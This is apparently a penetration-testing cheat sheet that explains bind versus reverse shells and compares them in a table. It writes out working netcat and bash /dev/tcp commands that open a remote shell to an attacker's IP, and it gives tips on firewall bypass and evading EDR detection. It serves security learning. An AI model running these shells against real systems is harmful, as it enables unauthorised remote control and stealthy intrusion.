# Bind Shell vs Reverse Shell – Key Differences

---
## 🔄 Reverse Shell

- **Target machine** connects **outbound** to attacker’s listener  
- **Attacker listens**, target initiates connection  

### How It Works:
1. Attacker runs: `nc -lvp 4444`  
2. Target runs: `nc 10.10.100.8 4444 -e /bin/bash`  

### Pros:
- **Bypasses inbound firewalls** (outbound traffic usually allowed)  
- **No open ports** on target → stealthier  
- Works through **NAT** (target reaches out to public IP)  

### Cons:
- Requires **outbound connectivity** from target  
- May be blocked by **egress filtering** (corporate firewalls)  

> ✅ **Use case**: External penetration tests, most real-world scenarios
---
## 🔒 Bind Shell

- **Target machine** opens a port and **listens** for connections  
- **Attacker connects to target** on that port  

### How It Works:
1. Target runs: `nc -lvp 4444 -e /bin/bash`  
2. Attacker connects: `nc 192.168.1.10 4444`  

### Pros:
- Simple setup on target  
- No outbound firewall rules needed on target  

### Cons:
- **Blocked by firewalls** (inbound connections often restricted)  
- **Exposed port** visible in scans (`netstat -tulpn`)  
- Requires attacker to **initiate connection** (harder in NAT/restricted networks)

> ⚠️ **Use case**: Internal network pivoting where inbound access is allowed

---
## 🆚 Direct Comparison

| Feature | Bind Shell | Reverse Shell |
|--------|------------|---------------|
| **Connection direction** | Attacker → Target | Target → Attacker |
| **Firewall bypass** | ❌ Fails (inbound blocked) | ✅ Works (outbound allowed) |
| **Visibility** | Open port on target | No open ports on target |
| **NAT compatibility** | ❌ Fails | ✅ Works |
| **Stealth** | Low (port scan detectable) | High (no listening port) |
| **Reliability** | Low (firewall-dependent) | High (outbound = trusted) |

---
## 💡 Pro Tips

- **Always prefer reverse shells** in external engagements  
- **Bind shells** useful for **internal pivoting** after initial access  
- **Modern EDRs detect both** — use encrypted channels (e.g., `msfvenom` + Meterpreter)  
- **No `-e`?** Use pipe-based shells:  
  ```bash
  # Linux reverse shell without -e
  bash -i >& /dev/tcp/10.10.100.8/4444 0>&1
  ```

> 🔥 **Golden Rule**:  
> **Reverse shells win 95% of the time** — they work with how networks are actually secured.